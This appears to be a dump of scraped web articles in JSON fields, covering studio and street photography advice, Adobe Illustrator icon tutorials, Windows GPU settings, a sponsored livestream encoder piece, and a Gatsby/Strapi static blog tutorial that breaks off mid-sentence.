haze effect and in contrast to that, the model in the foreground was almost too clear and perfect by comparison. This caused a visual dissonance that felt jarring to me. By adding a low contrast filter to my lens, I was able to soften some of the more contrasting elements of the model. As a result, the foreground and background elements of the shot now seemed to come together a little more with it in place. \nIn my opinion, the low contrast filter really ties this shot together and it\u2019s a lens filter I\u2019ve been using a lot for this reason recently. I\u2019d love to show you a multitude of examples images of my uses of the low contrast filter for studio shooters\u2026. but that\u2019s an article for another day ;) \nClosing Comments \nOverall I was incredibly pleased with these shots and the effect I\u2019d achieved in a small studio space. The plant behind the model really did look like it was shrouded in mist or fog and I believe it does add an element of depth and visual interest without being overly distracting. \nI think I\u2019ve explained my thought process and execution fairly comprehensively, but there are a few things I\u2019d like to hammer-home. \n1. Always be looking to come up with new ways of making your studio shots more engaging. With the proper motivation, there should be no reason to ever get bored of the backgrounds in a studio. \n2. Dissect light and redeploy its properties for your own benefit. Don\u2019t be too hasty to dismiss one form of outside lighting as impossible for inside lighting. Light has very consistent and predictable properties and by taking those particular properties and using them indoors you can produce striking results. From stark, bright sunlight to hazy overcast light, all of which are very possible indoors with the right knowledge. \n3. Test, test, test. Don\u2019t be fooled by what the internet tells you, great results take time and experience and the only way to get that experience is to test new ideas. I could have purchased a single diffusion gel and set about doing my shoot, but I guarantee the results on shoot day would have been awful as a result. I took the time the test a bunch of diffusion gels to find the perfect one for the shoot and I believe that was time well spent. Can you bill that test time to the client? Rarely, but a reshoot may cost you more as a result of not doing it. \n4. I think as studio shooters, we can often be guilty of lighting our subject and background separately. Although I believe this is a good discipline to consider, always be mindful of tying them back together in camera. In this shoot, I initially got the beautiful hazy background I wanted, but the model was stark and crisp in comparison. As a result, she felt \u2018stuck-on\u2019 afterward so I wanted a way to tie the foreground and background back together. In this instance, the low contrast filter did the job but other elements like colors or toning can also do this. Light them separately, but don\u2019t forget the bigger picture. \nAbout the author : Jake Hicks is an editorial and fashion photographer based in Reading, UK.

      "text": "Welcome back to another Illustrator tutorial from our retro hardware series ! In this how-to, we\u2019re going to learn to create a NAS Icon (or a Network-Attached Storage icon) using some simple geometric shapes and tools. \nSo, get your software up and running let\u2019s jump straight into it! \nTutorial Details: How to Create a NAS Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2018 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Pixel Perfect Workflow \nEstimated Completion Time: 25 Minutes \nFinal Image: NAS Icon \nStep 1 \nWe\u2019re going to create a NAS icon by first setting up a new project file. Head over to File > New (or use the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 128 px \nHeight: 128 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web ; the only one you\u2019ll have to manually adjust is the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nAs soon as we\u2019ve finished setting up our project file, we can start working on the actual icon. We\u2019ll do this by creating the background, which we\u2019ll do using a 120 x 120 px circle. Color the circle using #F15A24 , and then position to the center of the underlying Artboard . \nStep 3 \nCreate the main shape for the network node using a 12 x 12 px circle, which we will color using white ( #FFFFFF ). Then, center align it to the larger underlying background, positioning it at a distance of 30 px from its bottom anchor point . \nStep 4 \nGive the shape we\u2019ve just created an outline. You can do this by using the Stroke method, creating a copy of itself ( Control-C ) which we will paste in front ( Control-F ). Then, adjust by changing its color to #2A323D . Then, flip its Fill with its Stroke ( Shift-X ) setting, its Weight to 4 px , and make sure to select and group the two shapes together using the Control-G keyboard shortcut. \nStep 5 \nGrab the Pen Tool (P) and use it to draw two 14 px wide/ 4 px thick Stroke lines ( #2A323D ) with a Round Cap . We will position this onto the sides of the node, as seen in the reference image below. \nStep 6 \nAdd the vertical network line using an 8 px tall/ 4 px thick Stroke ( #2A323D ), which we will position on top of the node\u2019s top anchor point . Take your time and once you\u2019re done, select and group all of the node\u2019s composing sections using the Control-G keyboard shortcut. \nStep 7 \nCreate the main shapes for the bottom storage housing unit using a 48 x 12 px rounded rectangle ( #FFFFFF ) with a 4 px Corner Radius and a 4 px thick outline ( #2A323D ). We will group ( Control-G ) this and then position it on top of the vertical stroke\u2019s upper anchor point . \nStep 8 \nIn step 8, you get to start adding details to the housing by creating a 30 x 4 px rectangle. We\u2019ll color this rectangle using #2A323D . Then, center align the rectangle to the larger body, positioning it at a distance of 4 px from its left edge. You\u2019re over halfway there! Soon you\u2019ll know how to create a NAS icon in no time flat. \nStep 9 \nFinish off the current section by adding a 4 x 4 px circle ( #2A323D ), which we will position onto the opposite side. Be sure to leave a smaller 2 px gap. Once you\u2019re done, don\u2019t forget to select and group ( Control-G ) all of the housing\u2019s composing shapes before moving on to the next step. \nStep 10 \nCreate the remaining housing units using two copies ( Control-C > Control-F twice) of the one that we\u2019ve just finished working on. We will vertically stack one on top of the other so that their paths overlap, as seen in the reference image. \nStep 11 \nAdd the upper section of the NAS using a 40 x 6 px rectangle. We will color this rectangle using #2A323D , then position it on top of the third unit\u2019s path. \nStep 12 \nAdjust the shape we\u2019ve just created by setting the Radius of its top corners to 4 px . You can do this in the Transform panel\u2019s Rectangle Properties . Once you\u2019re done, make sure you select and group ( Control-G ) all of the NAS\u2019s composing sections before moving onto the next step. \nStep 13 \nFinish off the icon (and the whole project!), by adding a circular shadow using a 36 x 4 px ellipse. We will color this using #2A323D , and then we\u2019ll center align to the NAS. Position it at a distance of 8 px from its bottom edge. Once you\u2019re done, don\u2019t forget to select and group all of the icon\u2019s composing shapes using the Control-G keyboard shortcut. \nAwesome work! You can now create a NAS icon in Illustrator! \nAs always, I hope you had fun working on this project.

      "title": "How to Force an App to Use Dedicated Graphics Card (GPU) on Windows",
      "text": "Computer with dual GPUs are common, the one that is the built-in graphics card that usually is Intel HD Graphics and the second dedicated graphics card may be from Nvidia or AMD. A laptop that has two GPUs are capable to run high-end 3D games and software that need hight performance. Usually whenever any app required more graphics processing that a built-in GPU can\u2019t handle then it automatically switches to the dedicated graphics card. Due to some reason, you might want to force an app to use dedicated GPU, If this is the case then continue reading to know that. \nYou can set the preferred graphics card for the apps and games from the graphics control panels of the dedicated card. In the latest version of Windows 10, Windows introduced a new feature which allows you to set the preferred graphics card for performance and battery saving for Windows stores apps and also for the other desktop app. You can also add your own app to the list if it\u2019s not showing there. \nIn my case, I have Core i5 6 th generation laptop with Intel (R) HD Graphics 520 which is pretty good for normal and low-end gaming. My laptop also comes with a dedicated 2GB AMD Radeon (TM) R7 M340. This dedicated AMD Radeon is the powerful card as compared to Intel (R) HD Graphics 520 but every time I played a game or use apps such as PUBG and Adobe software, built-in graphics used instead of the dedicated graphic card. \nAdvertisement \nForce an App or Games to use dedicated graphics card \nAssigning dedication graphics card to an app can be achieved by following different methods and all are very simple. Just choose one that is more suitable in your situation. \nMethod 1: Add app to Graphic Card preferences \nTo add apps or games to Graphic card preferences means you are telling your Graphics to use this app or game to highest performance. \nFor AMD users : Open you AMD Radeon setting by right-clicking on empty space on your desktop and then select AMD Radeon Settings . Now click on System tab from the right corner and you will see the \u201cSwitchable Graphics\u201d tab click on it. \nIt will list down all the application which needs to use the graphic card but if your app or game not listed simply click on \u201cRunning applications\u201d and select the \u201cInstalled Profiled Application\u201d. \nNow click on the browse button and select your desired app or game. After that click on the recently added app and select the \u201cHigh Performance\u201d option and you are done. \nFor Nvidia users , open Nvidia\u2019s Control panel and click on Manage 3D settings. Here sect Preferred graphics processor to high-performance NVIDIA processor. \nMethod 2: Add App to Windows 10 Graphics Performance Preference \nWindows 10 allows you to add any app or game to Graphics Performance Preference which means every time you run the app will use your computer hardware graphics as you set in graphics preference for an app. \nCustomize the graphics performance preference for specific apps. Preference may provide better app performance or save battery life. The choice may not take effect until the next time the app launches. \nTo add your game in Graphics Performance Preference, press Windows key from your keyboard, then type graphic settings to search for the settings and hit enter to open it. \nHere on the Graphics settings window, click the Browse button (from the drop-down you can either choose a Classic app that you installed outside Microsoft App Store or Universal app that installed from the App Store) \nSelect the app from your computer (like I am selecting Tencent Gaming Buddy) and then hit Add button. \nAfter adding, select the app that you just added and then click on the Options button. This will open up Graphics specification for that app. Here select High performance and click on save. As you can see below in the screenshot. The Power saving GPU is Intel HD Graphics 520 and the High-performance GPU is AMD Radeon M340. I need high performance for this gaming app so I choose Hight performance. \nNow, every time I run this app on my computer, this will automatically use the high-performance GPU. \nMethod 3: Disable Built-in Graphics \nYou can also disable the built-in graphics adapter and force Windows to use a dedicated graphics card . This trick will work on all other Windows version including old Windows editions like Windows 8/8.1, Windows 7, etc. This will not harm your computer or Windows. \nNote : if you disable built-in graphic card from you Windows then you can\u2019t set the brightness, also your Windows sleep option will be gone. To get back these features you need to re-enable built-in graphics. \nOpen Device Manager by right-clicking on start menu icon and then select Device Manager . \nHere expand the Display adaptors and then right-click on the Built-in Intel (R) HD Graphics 520 (you will be different) and then click on Disable device . Your Windows screen will go black for a second which means Windows is switching your Graphics card to dedicated card. \nThat\u2019s it if you wish to re-enable your built-in graphics then repeat the above steps and click on enable device. \nMethod 4: Enable Windows Gaming Mode \nLatest Windows 10 version like Windows 10 May update 2019 offers built-in gaming mode in settings, which helps you to optimize Windows 10 for gaming. This Windows 10 feature prevents system background processes such as Windows update, temporarily disables notification, etc. To enable this feature press \u201cWindows+I\u201d keys combination from keyboard. This will open up the Windows Settings. Here in the Settings click on Gaming option. \nIn the Gaming section, click on Game Mode from the left panel and then turn the \u201cGame Mode\u201d toggle button on. \nDid you learn anything new today? Please share your experience of how you\u2019re using dual GPU on your laptop. Did you ever use high performance GPU on the laptop battery? Tell use which dual GPU computer you are using including the brand name and specs.",

      "text": "Tutorial: How to Leverage HEVC Compression with the Teradek VidiU Go \nPaul Schmutzler explains how you can take advantage of the cost and bandwidth savings of HEVC in your livestreams with the Teradek VidiU Go.\n \nPage 1\n \n \nThis tutorial is sponsored by Teradek . \nToday I'm going to talk to you about how you can stream flawless, high-quality video to your audience and save a ton of data at the same time. Why does it matter what codec you can stream in? Your audience may not not care if you're using H.264 or H.265 compression, but your wallet will. \nLet me explain. It takes about 6 megabits of data per second (Mbps) to stream a 1080p video in H.264, also known as AVC. Most of the encoders you use today are utilizing this codec. Assuming you're paying about 50 cents per gigabyte, you'd pay $1.35 to stream a one-hour program. \nH.265, also known as HEVC, uses approximately half the bandwidth of H.264, and provides a higher-quality stream. With HEVC, you're paying only 68 cents to stream that same hour of footage. You just cut your cost in half by making one simple change. \nHEVC is still a new technology, so there aren't a lot of encoders out there that can do this. But the Teradek VidiU Go can. What's more, the Go lets you easily switch between H.265 and H.264 if you ever need to. \nBut most live platforms don't support HEVC yet, right? That's true, which is why Teradek provides a solution that lets you take full advantage of HEVC now. \nTeradek's cloud service Core comes with some amazing benefits. One of them is the ability to transcode H.265 to H.264, the standard that all your favorite platforms support. By streaming to Core and HEVC and transcoding it, you save a ton of data on the uplink and deliver the same high-quality video to your audience. Core can also stream to multiple platforms at the same time. Twitch, YouTube, Facebook custom RTMP, and many more are all supported. Connecting the Go to Core is easy. \nIn the example in the tutorial video, I send Core an HEVC stream and Core is transcoding that to send it to my different platforms. With the Go, you're already future-proofed and ready to take advantage of cutting-edge video compression. \nSo, whether you're in a crowded auditorium or on a remote mountaintop, the Teradek VidiU Go with HEVC encoding technology can ensure your stream is robust and beautiful, even in the most challenging of broadband areas. \nPage 1\n \n \nRelated Articles \nI found the VidiU Go to be up to the Teradek standard of professional production gear, now for the mobile, bonded streaming audience. \nPaul Schmutzler demonstrates how to deliver a solid stream from any location with the Teradek VidiU Go. \nPaul Schmutzler demonstrates how to stream to multiple social platforms simultaneously with the Teradek VidiU Go.",

      "title": "A Guide to Overcoming Fear in Street Photography (And in Life)",
      "text": "First things first. For me, street photography is more than just taking candid photos. Street photography can also be asking strangers permission to photograph them or photographing empty streets. Whatever it is, the common nominator is that you go on the street and take photos of the \u201cstreet life.\u201d That\u2019s how I see it. \nIf you want to take a photograph of a building, it\u2019s very predictable. You can sit there with your camera all day long and compose the shot and think and wait. The building is not going to react to you taking the photo, nor is it walking away. \nTaking pictures of people is what most street photographers like to do as people are certainly one of the most exciting subjects to photograph. No doubt. \nNo doubt as well that people are very challenging to photograph. They move quickly and are unpredictable. Unpredictable in a sense that everyone can react differently. Every situation is different. \nThis is what makes photographing people interesting but also causes fear. Whether taking candid pictures or asking permission, the fear is there. We want to make a certain photo, but then again we often don\u2019t do it. Why is it? Why is it that we want to do something and then we don\u2019t do it. It\u2019s as if there\u2019s a wall that creates this massive block. \nHave you ever walked around the street with your camera afraid to take pictures of strangers? So that you miss opportunity after opportunity. Or you see someone cool and think that you should ask them if you can photograph them and you don\u2019t. I have been there many many times. \nIn this article, I mainly focus on the fear of asking people permission to take their photo and taking candid photos (especially from close), but because the principles are universal, a lot applies to anything else you might be afraid to do in life. \nThe Fear \nThe first thing to understand is that the fear you have won\u2019t go away. It\u2019s hard-wired into our brains, so we can\u2019t just get rid of it. What we can do is to learn to manage it. So instead of not doing the thing you want to do, you do it anyway. \nGetting rid of the fear wouldn\u2019t be advisable either. It\u2019s what keeps us alive. Imagine not being afraid of jumping off a cliff. That wouldn\u2019t end very well, right? \nWe also often think that some people are fearless or in some way different and it\u2019s therefore easy for them. That is not true. We all have the same brain with the same \u201chardware.\u201d Yes, of course, we\u2019re all different, but we all eat, breathe, walk, have sex, and acquire our mother tongue the same way. So the core characteristics are the same. Just the details vary. \nBack in the caveman times doing something out of the line, like confronting the wrong person could end up us being thrown out of the tribe which was the equivalent to a death sentence. So, naturally, our brains keep us from doing anything that puts us in the spotlight. It wants to keep us safe and the best way to do that is to keep a low profile and do the safe things like everyone else. \nStreet photography can put us in the spotlight. Taking pictures of people without asking their permission from close, is in a way, confronting them. You are entering their personal space. Some people might not like it and take it as a sign of aggression or mocking. \nEven asking permission can be scary, and therefore, our brain doesn\u2019t want us to do that. Again, back in the caveman times, approaching strangers put us in the spotlight, and this potentially might not have ended very well. Our brain wants to minimize the risk as much as possible. It tries to keep you alive, no matter what. It doesn\u2019t care about your artistic endeavors or self-development at all. \nNowadays, in our modern society, things are very different than they used to be thousands of years ago. We don\u2019t live in tribes anymore, and therefore we can\u2019t be thrown out of one. Having a \u201cbad\u201d interaction with someone doesn\u2019t mean anything either. Most likely we\u2019re never going to see that person ever again. \nOur brains don\u2019t know that. We still have the same mind as we had in the caveman times. Evolution hasn\u2019t caught up with the rapid developments of human society yet. This is why we can binge eat chocolate or other high-calorie foods. Thousands of years ago high-calorie foods were very scarce, and if you found one, you ate all you could as it might have saved your life (literally). \nI wrote all this because I think half of the battle is understanding the \u201cwhy.\u201d Just by understanding why we\u2019re afraid, already lowers the anxiety as whenever we feel the fear, we realize that \u201coh, it\u2019s just my brain doing its thing.\u201d \nThe \u201cHow To\u201d \nThere is no magic pill, but I\u2019ve found out several ideas and concepts that can help a lot to overcome the fear, especially if you combine them. \nIt\u2019s excitement \nFirst, we need to realize that the fear we\u2019re experiencing is not a real fear. It\u2019s excitement. Yes, excitement and fear have the same symptoms, but we often misinterpret excitement as fear. \nWe get excited because we want to take a photo. It\u2019s our mind telling us that this is what we have to do. It\u2019s not really fear. There are no tigers attacking us. Our life is not in danger, so it can\u2019t be a real fear. It must be excitement. \nLook at it as a compass. When you feel the so-called \u201cfear,\u201d it\u2019s a sign that you have to do it. I know it\u2019s easier to be said than done, but try to think of it as a positive thing, not a negative thing. Steven Pressfield calls it the \u201cresistance\u201d. \nMissed opportunity \nWhat you should be afraid of are missed opportunities. If you don\u2019t take that candid photo or don\u2019t ask that stranger to take a portrait of her, then know that you will never have the same opportunity again \u2014 not that kind. \nSo instead of being afraid of awkwardness or rejection or weird looks or even a small confrontation, be afraid of the missed opportunity. \nYou will never regret taking action, but you will regret not taking action. \nStep out of the loop \nFirst, you realize that you\u2019re in a loop. Second, you make a conscious decision to step out of it. \nWhat do I mean by a \u201cloop\u201d? When you go through similar thought patterns resulting in similar actions or inaction. e.g., when you know, you should get out of the bed in the morning, but you keep putting it off until at one point you decide to break the loop. \nThe same goes on in your mind when you walk around with the camera afraid of taking pictures. Pay attention to your thoughts. They are always the same, right? And the action? Also, the same. However, \u201cthe action\u201d in this case would be inaction. You keep walking (loop). \nThe solution is to do the same thing as you do when you get out of bed in the morning. You simply decide to get out. \nRelating this to street photography, you can say, \u201cExcuse me, you look so cool, may a take a portrait of you?\u201d That\u2019s all it takes. Don\u2019t worry about the rest; the rest will come naturally. Even if it doesn\u2019t come naturally, it\u2019s because you haven\u2019t got enough practice. \nNobody is born to be great at interacting with people or dealing with confrontation. It\u2019s a skill that can be learned by continuously throwing yourself into these situations. \nAt one point you have to break the loop, it\u2019s not going to happen by itself. You have to make a decision. \nWhat do other people think of me? \nThis is a really common one. \nWe all think about what other people are thinking of us. The truth is, nobody cares. \nYou might be worried about what other people are thinking of you, but that\u2019s the same what everyone else is also thinking. \nMost people walking on the street can\u2019t see beyond their arm\u2019s length, especially in the present day and age where many people are on their phones in a constant derp-like state. Everything\u2019s just a blur for them. \nWhen you start a conversation or take a photo candidly, you might get the attention of the nearby people, but only for a couple of seconds. Right after that, they\u2019re back to their thoughts. \nProof not promises \nAsk yourself what are you afraid of and try to get to the root cause. Then find an argument against that. \ne.g., \u201cI\u2019m afraid to get close to people and take a photo because they might get mad and punch me in the face.\u201d What kind of counter-argument could we use? \nYou prove to your brain that the fear is ungrounded. Ask yourself if this has ever happened to you? Has anyone ever punched you in the face after taking a photo and not asking permission? Probably not. What\u2019s the worse that has happened? What\u2019s the worse that could happen? \nThese are just some of the questions to ask yourself while analyzing what you\u2019re afraid. \nThis is one part of it. \nThe second part is to give your brain proof, not promises. Thinking and finding arguments against your brain only has a limited effect. What is way more powerful is to show your brain that the fear is unfounded. \nThe best way would be actually to do the thing you\u2019re afraid of. Face your fears, head-on. \nHowever, for many people, this is very difficult. e.g., some people are afraid of flying, and they go absolutely out of their way not to fly. Many people end up not flying their entire lives. This is how strong the fear can be. It dictates our decisions. \nYou can start small. Look at photographs that are made from close distance by other street photographers. Look at POV-style videos of street photographers getting close to their subjects and interacting with them. Check out Eric Kim doing street photography with flash in LA or Bruce Gilden\u2019s famous NY street photography videos. \nDoing this proves your brain that nothing bad happens and that it\u2019s \u201cnormal\u201d to take photos on the street. \nThis will give you enough proof to go out and replicate it yourself and further gaining evidence that it\u2019s okay and that there\u2019s nothing to be afraid. \nThe fancy term for this is \u201ccognitive behavioral therapy\u201d and it\u2019s one of the most powerful methods to treat this kind of anxiety. \nPeople who are afraid of snakes are first shown snakes behind the glass. Then they are shown the snake handled by a professional snake handler, and before they realize, they have the snake on their hands. \nIt\u2019s a battle \nAs I said at the beginning of this article, \u201cthe fear\u201d never really goes away. You become more confident, and you learn to manage it, but because it\u2019s hardwired, it\u2019s there to stay. \nWhat you notice is that once you start taking action and your brain will see the proof that nothing happens, you begin to get into a flow-like state where pictures take themselves. You\u2019re just a vessel. \nLet\u2019s consider asking strangers for a portrait. The first one is hard and so might be the second, but then you notice that it will get easier and easier until you reach a point where you don\u2019t care, and you want to interact with people (or get close and take a photo without permission). You start to feel cocky even. \nUntil you go to sleep and the next day you have to start all over again. \nEven though the next day you start from zero, it\u2019s not really zero, as you still have the experiences. Over time these experiences accumulate, and this is how confidence forms. You know that you have seen it all (or at least a lot), and know you\u2019ll be alright. You\u2019ll be able to manage whatever is thrown to your way. That\u2019s true confidence. \nAbout the author : Kristjan Vingel is a street photographer based in Luxembourg.

      "title": "How to Draw a Whale Vector in Adobe Illustrator",
      "text": "This time, we\u2019ll learn how to draw a whale vector using basic geometric shapes in Adobe Illustrator. We\u2019ll learn working with Live Corners, the Scissors Tool, the Pathfinder panel, and we\u2019ll use other beneficial vector tools and functions. Let\u2019s get started! \nTutorial Details \u2013 How to Draw a Whale Vector in Adobe Illustrator \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Shape Building, Live Corners, Pathfinder Panel, Stroke Panel \nEstimated Completion Time: 20 minutes \nFinal Image: Cute Blue Whale \nStep 1 \nLet\u2019s start learning how to draw a whale vector by first making the whale\u2019s body. Take the Rectangle Tool (M) and make a 245 x 90 px blue shape. \nGrab the Direct Selection Tool (A) and select both bottom corners of the rectangle. Pull the circle marker of the Live Corners to the center of the shape, making the corners rounded. You can also set the exact value manually in the control panel on top. Here I set it to 90 px. \nStep 2 \nNow let\u2019s add a piece of the tail. Use the Rectangle Tool (M) while holding down Shift to create a 30 x 30 px square. Place it on the top right part of the body shape, as shown in the image below. \nLet\u2019s make sure that the shapes are aligned perfectly. Select both shapes and click the body shape once again using the Selection Tool (V) . Now that the body shape has thicker selection, it is the Key Object to which all other shape will be aligned. Head to the control panel on top and click Horizontal Align Right. There we have it! \nNow let\u2019s give a proper shape to the tail. This is an important aspect to learning how to draw a whale vector. Select its top left corner with the Direct Selection Tool (A) and make the corner 30 px rounded. Finally, click the Corners submenu in the control panel on top and select Inverted Round to make the shape rounded inwards. \nStep 3 \nLet\u2019s make the top part of the tail. Take the Ellipse Tool (L) and make a 35 x 65 px shape. \nGrab the Scissors Tool (C) and click the top and bottom anchor points of the shape to split it apart. Now we have two separate elements of the tail. \nStep 4 \nRotate the elements and make them overlap as shown in the screenshot below. Place the elements on the tip of the tail. \nStep 5 \nLet\u2019s draw a tummy of our cute blue whale. Take the Pencil Tool (N) and set the Fill color to None in the Color panel. Draw a wavy curve across the body. \nNow select both the body and the curve, open the Pathfinder panel ( Window > Pathfinder ) and click Divide to split the body shape apart. \nStep 6 \nWe\u2019re almost halfway to learning how to draw a whale vector successfully! For step 6, apply a light-blue color to the tummy of our whale. \nStep 7 \nNow let\u2019s add a fin. We\u2019ll use a half-circle shape that we\u2019ve made for the tail. Duplicate the shape ( Control-C > Control-V ) and make it larger. Rotate the fin and attach it to the middle of the body. \nIf it\u2019s upper tip is sticking out from the top of the body, we can easily fix it using the Eraser Tool (Shift-E) . Keeping the shape selected, take the Eraser Tool (Shift-E) and draw over the piece that you want to delete. \nStep 8 \nNow we\u2019ll draw an eye. Take the Ellipse Tool (L) , hold down Shift and make a circle. Set its Fill color to None and its Stroke color to dark-blue. \nOpen the Stroke panel ( Window > Stroke ) and set the Weight to 5 pt, Cap to Round Cap . Use the Scissors Tool (C) and click the left and right anchor points to split the shape into two arches. \nDelete the lower piece. Place the second half on the whale\u2019s muzzle, making a closed eye as if he was smiling. \nStep 9 \nLet\u2019s make our illustration more detailed by adding some outlines to the silhouette. Start by selecting the top part of the body, Copy (Control-C) and Paste in Front (Control-F). Set the Fill color of the copy to None and the Stroke color to dark-blue. Take the Scissors Tool (C) and click the points that are marked in the screenshot below. If there is no anchor point, you can click the line itself to create a point and split it with the Scissors Tool (C) as well. \nDelete the unneeded piece of the outline completely and move the points with the Direct Selection Tool (A) to create the gaps between the lines. \nSet the Stroke Weight to 3 pt , making the lines a bit thinner. \nStep 10 \nAdd more lines, using the same technique with the strokes and the Scissors Tool (C). \nStep 11 \nWe\u2019re almost done learning how to draw a whale vector! Finish up with our cute blue whale by adding a small fountain on top. Use the Pen Tool (P) or the Line Segment Tool (\\) to add those vertical strokes. \nWoot! Our Cute Blue Whale is Finished! \nGreat job, my friends! You now know how to draw a whale vector. I hope you\u2019ve enjoyed following this tutorial and discovered some new simple tips and tricks that will be useful in the future. \nHave fun, and remember, don\u2019t stop drawing! \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

      "title": "Building a Static Blog Using Gatsby and Strapi",
      "text": "REVISED AND UPDATED: 15 JUNE 2019 \nA static website contains Web pages with fixed content. Technically, it is a simple list of HTML files, which displays the same information to every visitor. Unlike dynamic websites, they do not require any back-end programming or database. Publishing a static website is easy: the files are uploaded on a simple Web server or storage provider. The two main advantages of static websites are security and speed: there is no database so it can not be hacked and there is no need to render a page for each request, which makes Web browsing faster. \nTo make their creation easier, numerous open-source static websites generators are available: Jekyll , Hugo , Hexo , etc. Most of the time, the content is managed through static (ideally Markdown) files or a Content API. Then, the generator requests the content, injects it in templates defined by the developer and generates a bunch of HTML files. \nProgressive Web Apps (PWA) are web applications, highly based on JavaScript, and are reliable, fast and engaging . Since they make web browsing much faster and offer a better user experience, PWA has become the default way to build Web interfaces. Thus, many amazing front-end frameworks appeared over the last couple years: Angular, React and more recently, Vue. \nGatsby: when static websites meet Progressive Web Apps \nBoth static websites and PWAs have strong advantages which make us crave for a way to use them together in the same project! Luckily, we have tools that bridge the gap between them and the one we recently heard of is definitely Gatsby. So, we decided to give you a complete example of how to get started with Gatsby. A static website needs a source of content: in this example, we will deliver it using an API built with Strapi. \nWhat is Gatsby? \nGatsby is a blazing-fast website framework for React . It allows developers to build React based websites within minutes. Whether you want to develop a blog or a corporate website, Gatsby will fill your needs. \nBecause it is based on React, the website pages are never reloaded which makes the generated website super fast. A large set of plugins is available to allowing developers to save time coding. For example, plugins exist to get data from any source (Markdown files, CMS, etc.). Gatsby is strongly based on the \"node\" interface , which is the center of Gatsby's data system. \nCreated by Kyle Mathews , the project was officially released in July 2017 . (As of February 2109, Gatsby is in Gatsby v2 and is now used by many companies and for hundreds of websites . \nWhat is Strapi? \nStrapi is an open source Headless CMS Front-End Developers Love . It's more than a Node.js Framework and more than a Headless CMS , it saves weeks of API development time, and allows easy long-term content management through a beautiful administration panel anyone can use . \nThanks to its extensible plugin system, it provides a large set of built-in features: Admin Panel, Authentication & Permissions management, Content Management, API Generator, etc. \nUnlike other CMSs, Strapi is 100% open-source , which means: \nStrapi is completely free . \nYou can host it on your own servers , so you own the data. \nIt is entirely customisable and extensible , thanks to the plugin system. \nLearn Gatsbyjs with Strapi Headless CMS Video Tutorial Series \nPlease follow along watching the videos below and reading the text. You can watch just the videos or read just the text, but you will get the most from this tutorial by watching and reading both. The videos are designed to be used together with this article. \nThe videos follow the exact sequence of this article. The videos contain additional information and additional configuration details for a few sections. However, for intermediate to advanced users this article will be sufficient to get oriented and started building Strapi powered Gatsby projects. \nIndex of Tutorial \nLearn Gatsbyjs with Strapi Headless CMS Video Tutorial Series - Introduction \nLearn Gatsbyjs with Strapi Headless CMS Video Tutorial Series - Installation \n2A.

These will not work if your server(s) have not been started. \n1. Introduction \nThis video series will take you step by step through creating a blog in Gatsby and teach you how to connect it to the open sourced headless CMS - Strapi \nVIDEO \nImportant links from Video: \n2. Installation \nVIDEO \nImportant links from Video: \nStrapi CMS Setup \nTo make the magic happen, let's create a Strapi headless CMS and add some content. \nCreate a Strapi project \nInstall Strapi \nRequirements : please make sure Node 10 is installed and running on your machine. Strapi does not support Node.js versions 11 or 12. \nInstall Strapi using npm: \nnpm install strapi@beta -g \nNote: Strapi is in Beta version. \nGenerate a Strapi project \nCreate a directory named tutorial : \nmkdir tutorial \nNavigate into tutorial and then, using a single command, set-up and start your project inside your tutorial folder: \ncd tutorial strapi new cms --quickstart \nUsing the --quickstart flag creates a full Strapi project and automatically starts the server and opens up a tab in your browser. \n(If you leave off --quickstart . Strapi allows you to configure the project according to your needs, Strapi will ask you some questions about your preferences. In this case, reply to each of them or press enter to keep the default values. If you choose a different database than SQLite , you will need to separately install that database onto your system and have it running in the background.) \nAdditional information can be found in the Official Strapi documentation . \nCreate your first Administrator \nAdd your first Administrator using the registration page . This will be an Administrator role. \nRestarting Strapi \nAfter installation, and initial use, you will often close your project and work on other things, reboot your computer, etc. Therefore, you will need to restart Strapi and your project. \nEnter inside your project folder, on the command line, (in this case tutorial/ , : \ncd cms \nFrom cms/ , launch the Strapi server: \nstrapi develop // or npm run develop \nStarting here, you should be able to visit the admin panel of your project: http://localhost:1337/admin . You will now be directed to a login screen. Login using your Administrator role. \n2A. Administrators and Users \nVIDEO \nAdministrators and Users are separate roles. \nAn \"Administrator\" has access and rights to the backend of Strapi. They have the ability to add content, add plugins, upload images, etc... \nA \"User\" is someone who interacts with your project through the front-end. Someone who makes a purchase, has an account, leaves a review, a comment, etc. \nAt this point, you have created an Administrator , now you will need to create a User . \nClick on Users located under CONTENT TYPES in the left-hand menu. \nClick the blue + Add New User button in the top right corner. \nNext, complete the Username , Email , and Password fields. \nSelect ON for the Confirmed toggle field. \nTo the right, under Role , select Authenticated . \n3. Content Types \nVIDEO \nImportant links from Video: \nCreate a Content Type \nStrapi CMS projects are based on a data structure called Content Types (equivalent to models in frameworks and Content Types in Wordpress). \nCreate a Content Type named article with four fields: \ntitle (type string ) \ncontent (type text ) \nimage (type media ) \nauthor (type relation , many articles to one user) \nAfter creating your fields, as above, save your new content type and wait for Strapi to restart. \nInsert some entries \nAdd some articles in the database. To do so, follow these instructions: \nVisit the articles list page . \nClick on Add New Article . \nInsert values, link to an author and submit the form. \nCreate two other articles. \nNote: You can download the sample content from the video here . \n4. Roles and Permissions \nVIDEO \nAllow access to Article \nFor security reasons, API access is, by default, restricted. To allow access, visit the Auth and Permissions section for Public role , click on Public , select the Article - find action and save. At this point, you should be able to request the list of articles . \nStatic website development \nGreat job, our API is ready! We can start developing the static website. \n5. Setting up Gatsby \nVIDEO \nImportant links from Video: \nInstall Gatsby \nFirst, install Gatsby CLI: \nnpm install --global gatsby-cli \nGenerate a Gatsby project \nIn the folder tutorial that you previously created, generate your brand new blog: \ngatsby new blog \nStart in development mode \nEnter in your project's folder: \ncd blog \nStart the server: \ngatsby develop \nAt this point, you should already be able to get access to your Gatsby website at this address: http://localhost:8000 . \nInstall the Strapi source plugin \nWhen you manage a static website, your data can come from different sources: Markdown files, CSV files, a WordPress website (using the JSON REST API plugin), etc. \nGatsby understands this pretty well. So its creators decided to build a specific and independent layer: the data layer. This entire system is strongly powered by GraphQL . \nTo connect Gatsby to a new source of data, you have to develop a new source plugin . Fortunately, several source plugins already exist , so one of them should fill your needs. \nIn this example, we are using Strapi. Obviously, we are going to need a 